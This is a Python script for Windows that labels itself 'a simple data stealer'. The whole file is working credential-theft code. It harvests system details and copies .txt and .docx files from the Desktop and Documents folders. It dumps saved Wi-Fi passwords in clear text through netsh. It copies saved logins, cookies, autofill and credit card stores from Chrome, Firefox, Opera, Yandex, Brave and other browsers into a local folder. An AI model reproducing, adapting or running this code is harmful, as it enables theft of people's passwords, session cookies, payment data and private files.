#!/usr/bin/python
# -*- coding: utf-8 -*-
import os, fnmatch
import socket
from time import strftime
import getpass
import shutil
from shutil import copyfile
import datetime
import ctypes
import platform
import locale
import subprocess

try:
	if __name__ == "__main__":
		os.system("cls")
		windll = ctypes.windll.kernel32
		lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
		encoding = locale.getpreferredencoding()
		typeos = platform.system() + " " + platform.release()
		timedate = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
		time = datetime.datetime.now().strftime("%H:%M:%S").replace(":", "-", 2)
		user = getpass.getuser()
		hostname = socket.gethostname()
		path = os.getcwd()
		lip = socket.gethostbyname(socket.gethostname())
		timedate = "{~} " + timedate
		dirname = user + "_" + time
		prefix = "{~}"
		print("""
	 ___      ___   __     __   ___   _______        __      
	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)

		a simple data stealer.		                                                         
		""")
		print(timedate, "\n(")
		print("	" + typeos)
		print("	hostname: ", hostname)
		print(" 	username: ", user)
		print(" 	local ip: ", lip)
		
		dio = path + "\\" + dirname
		os.makedirs(dio)
		os.makedirs(dio + "\\Documents")

		def find(pattern, path, pok):
			global result
			result = 0
			duplicate = 0
			for root, dirs, files in os.walk(path):
				for name in files:
					if fnmatch.fnmatch(name, pattern):
						try:
							fileg = os.path.join(root, name)
							copyfile(fileg, dio + pok + name)
							result += 1
						except shutil.SameFileError:
							duplicate += 1

		find("*.txt", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
		res1t = "%.2i" % result
		find("*.txt", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
		res2t = "%.2i" % result
		find("*.docx", "C:\\Users\\{0}\\Desktop\\".format(user), "\\Documents\\")
		res1w = "%.2i" % result
		find("*.docx", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
		res2w = "%.2i" % result
		resst = int(res1t) + int(res2t)
		print(" 	{~} found .txt: ", resst)
		ressw = int(res1w) + int(res2w)
		print(" 	{~} found .docx: ", ressw)

		logfile = open(dio + "\\" + user + "-log" + ".json", "w")
		logfile.write("""
	 ___      ___   __     __   ___   _______        __      
	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)

		a simple data stealer.	

{0}
(
	{1}
	hostname: {2}
	username: {3}
	local ip: {4}
	""".format(timedate, typeos, hostname, user, lip))

		def networkpass(one, two):
			try:
				cost = 0
				data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(encoding).split('\n')
				profiles = [i.split(":")[1][1:-1] for i in data if one in i]
				logfile.write("Wi-Fi's [\n")
				for i in profiles:
					results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(encoding).split('\n')
					results = [b.split(":")[1][1:-1] for b in results if two in b]
					try:
						logfile.write("		{0}:{1}\n".format(i, results[0]))
						cost += 1
					except IndexError:
						logfile.write("		{0}:{1}\n".format(i, ""))

				print(" 	{0} found {1} network/s password/s".format(prefix, cost))
			except:
				print(" 	{0} found {1} network/s password/s".format(prefix, cost))

		if lang == "en_US":
			networkpass("All User Profile", "Key Content")
			logfile.write("	]")
		elif lang == "ru_RU":
			networkpass("Все профили пользователей", "Содержимое ключа")
			logfile.write("	]")

		def browsers():
			if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)):
				src = "C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)
				if os.path.exists(dio + "\\Google Chrome"):
					shutil.rmtree(dio + "\\Google Chrome")
				os.makedirs(dio + "\\Google Chrome")
				try:
					find("Cookies", src, "\\Google Chrome\\")
					find("Bookmarks", src, "\\Google Chrome\\")
					find("History", src, "\\Google Chrome\\")
					find("Login Data", src, "\\Google Chrome\\")
					find("Web Data", src, "\\Google Chrome\\")
					print(" 	{+} Google Chrome")
				except OSError:
					print(" 	{+} Google Chrome")
				

			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable".format(user)):
				src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\".format(user)
				if os.path.exists(dio + "\\Opera GX"):
					shutil.rmtree(dio + "\\Opera GX")
				os.makedirs(dio + "\\Opera GX")
				try:
					find("Cookies", src, "\\Opera GX\\")
					find("Bookmarks", src, "\\Opera GX\\")
					find("History", src, "\\Opera GX\\")
					find("Login Data", src, "\\Opera GX\\")
					find("Web Data", src, "\\Opera GX\\")
					print(" 	{+} Opera GX")
				except OSError:
					print(" 	{+} Opera GX")


			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable".format(user)):
				src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable\\".format(user)
				if os.path.exists(dio + "\\Opera"):
					shutil.rmtree(dio + "\\Opera")
				os.makedirs(dio + "\\Opera")
				try:
					find("Cookies", src, "\\Opera\\")
					find("Bookmarks", src, "\\Opera\\")
					find("History", src, "\\Opera\\")
					find("Login Data", src, "\\Opera\\")
					find("Web Data", src, "\\Opera\\")
					print(" 	{+} Opera")
				except OSError:
					print(" 	{+} Opera")		


			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles".format(user)):
				src = "C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles\\".format(user)
				if os.path.exists(dio + "\\Firefox"):
					shutil.rmtree(dio + "\\Firefox")
				os.makedirs(dio + "\\Firefox")
				try:
					find("cookies.sqlite", src, "\\Firefox\\")
					find("places.sqlite", src, "\\Firefox\\")
					find("key4.db", src, "\\Firefox\\")
					find("logins.json", src, "\\Firefox\\")
					find("formhistory.sqlite", src, "\\Firefox\\")
					print(" 	{+} Firefox")
				except OSError:
					print(" 	{+} Firefox")


			if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)):
				src = "C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)
				if os.path.exists(dio + "\\Yandex"):
					shutil.rmtree(dio + "\\Yandex")
				os.makedirs(dio + "\\Yandex")
				try:
					find("Cookies", src, "\\Yandex\\")
					find("Bookmarks", src, "\\Yandex\\")
					find("History", src, "\\Yandex\\")
					find("Login Data", src, "\\Yandex\\")
					find("Web Data", src, "\\Yandex\\")
					find("Ya Autofill Data", src, "\\Yandex\\")
					find("Ya Credit Cards", src, "\\Yandex\\")
					find("Ya Passman Data", src, "\\Yandex\\")
					print(" 	{+} Yandex")
				except OSError:
					print(" 	{+} Yandex")


			if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)):
				src = "C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)
				if os.path.exists(dio + "\\Vivaldi"):
					shutil.rmtree(dio + "\\Vivaldi")
				os.makedirs(dio + "\\Vivaldi")
				try:
					find("Cookies", src, "\\Vivaldi\\")
					find("Bookmarks", src, "\\Vivaldi\\")
					find("History", src, "\\Vivaldi\\")
					find("Web Data", src, "\\Vivaldi\\")
					find("Login Data", src, "\\Vivaldi\\")
					print(" 	{+} Vivaldi")
				except OSError:
					print(" 	{+} Vivaldi")
				

			if os.path.exists("C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)):
				src = "C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)
				if os.path.exists(dio + "\\Brave"):
					shutil.rmtree(dio + "\\Brave")
				os.makedirs(dio + "\\Brave")
				try:
					find("Cookies", src, "\\Brave\\")
					find("Bookmarks", src, "\\Brave\\")
					find("History", src, "\\Brave\\")
					find("Login Data", src, "\\Brave\\")
					find("Web Data", src, "\\Brave\\")
					print(" 	{+} Brave")
				except OSError:
					print(" 	{+} Brave")
				

			if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)):
				src = "C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)
				if os.path.exists(dio + "\\Chrome Canary"):
					shutil.rmtree(dio + "\\Chrome Canary")
				os.makedirs(dio + "\\Chrome Canary")
				try:
					find("Cookies", src, "\\Chrome Canary\\")
					find("Bookmarks", src, "\\Chrome Canary\\")
					find("History", src, "\\Chrome Canary\\")
					find("Login Data", src, "\\Chrome Canary\\")
					find("Web Data", src, "\\Chrome Canary\\")
					print(" 	{+} Chrome Canary")
				except OSError:
					print(" 	{+} Chrome Canary")


			if os.path.exists("C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)):
				src = "C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)
				if os.path.exists(dio + "\\Chromium"):
					shutil.rmtree(dio + "\\Chromium")
				os.makedirs(dio + "\\Chromium")
				try:
					find("Cookies", src, "\\Chromium\\")
					find("Bookmarks", src, "\\Chromium\\")
					find("History", src, "\\Chromium\\")
					find("Login Data", src, "\\Chromium\\")
					find("Web Data", src, "\\Chromium\\")
					print(" 	{+} Chromium")
				except OSError:
					print(" 	{+} Chromium")
					

			if os.path.exists("C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)):
				src = "C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)
				if os.path.exists(dio + "\\CocCoc"):
					shutil.rmtree(dio + "\\CocCoc")
				os.makedirs(dio + "\\CocCoc")
				try:
					find("Cookies", src, "\\CocCoc\\")
					find("Bookmarks", src, "\\CocCoc\\")
					find("History", src, "\\CocCoc\\")
					find("Login Data", src, "\\CocCoc\\")
					find("Web Data", src, "\\CocCoc\\")
					print(" 	{+} CocCoc")
				except OSError:
					print(" 	{+} CocCoc")


			if os.path.exists("C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)):
				src = "C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)
				if os.path.exists(dio + "\\Atom"):
					shutil.rmtree(dio + "\\Atom")
				os.makedirs(dio + "\\Atom")
				try:
					find("Cookies", src, "\\Atom\\")
					find("Bookmarks", src, "\\Atom\\")
					find("History", src, "\\Atom\\")
					find("Login Data", src, "\\Atom\\")
					find("Web Data", src, "\\Atom\\")
					print(" 	{+} Atom")
				except OSError:
					print(" 	{+} Atom")


			if os.path.exists("C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)):
				src = "C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)
				if os.path.exists(dio + "\\Orbitum"):
					shutil.rmtree(dio + "\\Orbitum")
				os.makedirs(dio + "\\Orbitum")
				try:
					find("Cookies", src, "\\Orbitum\\")
					find("Bookmarks", src, "\\Orbitum\\")
					find("History", src, "\\Orbitum\\")
					find("Login Data", src, "\\Orbitum\\")
					find("Web Data", src, "\\Orbitum\\")
					print(" 	{+} Orbitum")
				except OSError:
					print(" 	{+} Orbitum")		
		browsers()
		print(")")
		logfile.write("\n)")
		logfile.close()
		os._exit(0)
		#ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
		#os.system("cls")
except KeyboardInterrupt:
	os.system("cls")
	os._exit(0)
